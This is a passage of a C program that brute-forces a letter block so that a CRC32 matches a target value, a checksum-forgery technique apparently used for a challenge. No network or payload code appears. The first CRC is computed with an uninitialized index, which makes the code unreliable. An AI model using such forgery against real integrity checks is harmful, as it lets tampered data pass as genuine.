    0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a,
    0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,
    0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
    0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,
    0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e,
    0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
    0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,
    0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,
    0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
    0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,
    0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0,
    0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
    0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6,
    0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,
    0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
    0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d,
};
  
void display(char* str, char end)
{
    printf("%s%c", str, end);
    fflush(stdout);
}
  
/**
 * Write the content of correction to a file and exit.
 */
void write_exit(char* correction, size_t s)
{
    display(correction, '\n');
    FILE* f = fopen(filename, "w");
    fwrite(correction, s, 1, f);
    fclose(f);
}
  
  
int main(int argc, char* argv[])
{
    uint const crcinit = strtoul(argv[1], NULL, 10) ^ 0xFFFFFFFF;
    uint const goal = strtoul(argv[2], NULL, 10) ^ 0xFFFFFFFF;
    uint const r = strtoul(argv[3], NULL, 10);
    uint crc;
  
    unsigned char correction[SIZE_CORRECTION_BLOCK+1];
    uint crcs[SIZE_CORRECTION_BLOCK];
  
    // Setup filename
    snprintf(filename, 32, OUTPUT_FILE_FORMAT, argv[0]);
  
    // Set every byte to the minimum value
    memset(correction, MIN_VALUE, SIZE_CORRECTION_BLOCK);
    correction[SIZE_CORRECTION_BLOCK] = '\0';
  
    register uint i;
  
    printf("crcinit=%u goal=%u rotations=%u\n", crcinit, goal, r);
  
    // Build original CRCs
    crcs[0] = ((crcinit >> 8) & 0x00FFFFFF) ^ crc32tab[(crcinit ^ correction[i]) & 0xFF];
  
    for(i=1;i<SIZE_CORRECTION_BLOCK;i++)
    {
        crcs[i] = ((crcs[i-1] >> 8) & 0x00FFFFFF) ^ crc32tab[(crcs[i-1] ^ correction[i]) & 0xFF];
    }
  
    display(correction, '\r');
      
    while(1)
    {
        // Compare
  
        crc = crcs[SIZE_CORRECTION_BLOCK-1];
  
        // A, r times
        for(i=r;i--;)
        {
            crc = ((crc >> 8) & 0x00FFFFFF) ^ crc32tab[(crc ^ 'A') & 0xFF];
        }
        // ¤ == 0xc2a4
        crc = ((crc >> 8) & 0x00FFFFFF) ^ crc32tab[(crc ^ '\xc2') & 0xFF];
        crc = ((crc >> 8) & 0x00FFFFFF) ^ crc32tab[(crc ^ '\xa4') & 0xFF];
  
        if(crc == goal)
        {
            write_exit(correction, SIZE_CORRECTION_BLOCK);
            return 0;
        }
  
        // Update correction block
  
        i = SIZE_CORRECTION_BLOCK;
  
        while(i--)
        {
            correction[i]++;
            if(correction[i] == 91)
                correction[i] = 97;
            if(correction[i] != MAX_VALUE)
                break;
            correction[i] = MIN_VALUE;
        }
  
        if(i <= SIZE_CORRECTION_BLOCK - 4)
            display(correction, '\r');
  
        // If we reached the first byte, crc[-1] does not exist
        if(!i)
            crcs[i++] = ((crcinit >> 8) & 0x00FFFFFF) ^ crc32tab[(crcinit ^ correction[i]) & 0xFF];
  
        // Only the last i chars were changed, no need to update the others CRCs
        for(;i<SIZE_CORRECTION_BLOCK;i++)
        {
            crcs[i] = ((crcs[i-1] >> 8) & 0x00FFFFFF) ^ crc32tab[(crcs[i-1] ^ correction[i]) & 0xFF];
        }
    }
  
    return 1;
}
</--- crc_xor.c --->